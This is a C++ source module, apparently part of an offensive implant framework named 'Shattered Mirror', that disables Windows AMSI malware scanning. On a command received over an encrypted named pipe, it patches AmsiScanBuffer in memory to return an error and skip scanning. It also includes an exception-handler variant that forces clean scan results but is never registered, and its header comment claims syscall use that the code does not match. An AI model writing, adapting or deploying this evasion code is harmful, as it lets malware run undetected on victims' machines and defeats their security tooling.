/*=============================================================================
 * Shattered Mirror v1 — Atom 04: Standalone AMSI Bypass
 *
 * Implements a self-contained version of the VEH/DR AMSI bypass that can
 * be reflectively injected into a remote process. Since it's an Atom, it
 * utilizes the Orchestrator's Syscall functions via Atom_03_Sys to stay
 * hidden.
 *===========================================================================*/

#include "Atom_04_AMSI.h"
#include "../Orchestrator/AtomManager.h"
#include "../Evasion_Suite/include/indirect_syscall.h"
#include <cstring>

static PVOID s_pTargetAmsiScanBuffer = NULL;

#define AMSI_RESULT_CLEAN 0
#define S_OK_AMSI 0

/* Define locally so this Atom can be compiled as a standalone unit if needed */
static LONG NTAPI AtomVehAmsiHandler(EXCEPTION_POINTERS* pExInfo) {
    if (pExInfo->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP) {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    if (pExInfo->ExceptionRecord->ExceptionAddress == s_pTargetAmsiScanBuffer) {
        pExInfo->ContextRecord->Rax = S_OK_AMSI;

        __try {
            ULONG_PTR rsp = pExInfo->ContextRecord->Rsp;
            PVOID* ppResult = (PVOID*)(rsp + 0x30);
            if (*ppResult) {
                *(DWORD*)(*ppResult) = AMSI_RESULT_CLEAN;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}

        pExInfo->ContextRecord->Rip = *(ULONG_PTR*)pExInfo->ContextRecord->Rsp;
        pExInfo->ContextRecord->Rsp += sizeof(ULONG_PTR);
        pExInfo->ContextRecord->Dr6 = 0;

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

DWORD WINAPI AMSIBypassAtomMain(LPVOID lpParam) {
    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
    if (!hPipe) return 1;

    BYTE SharedSessionKey[] = "LdRrpJFuq4uq1smR";

    while (TRUE) {
        IPC_MESSAGE inMsg = { 0 };
        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
            if (inMsg.CommandId == CMD_EXECUTE) {
                HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
                if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");

                if (hAmsi) {
                    void* pAddr = GetExportByHash(hAmsi, djb2_hash_ct("AmsiScanBuffer"));
                    if (pAddr) {
                        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
                        DWORD oldProtect;
                        VirtualProtect(pAddr, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
                        memcpy(pAddr, patch, sizeof(patch));
                        VirtualProtect(pAddr, sizeof(patch), oldProtect, &oldProtect);

                        char report[] = "[AMSI] Memory Patch Applied Successfully. ScanBuffer neutralized.";
                        IPC_MESSAGE outMsg = { 0 };
                        outMsg.CommandId = CMD_REPORT;
                        outMsg.dwPayloadLen = (DWORD)strlen(report);
                        memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
                        IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
                    }
                }
            }
        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
            break;
        }
        Sleep(500);
    }
    return 0;
}
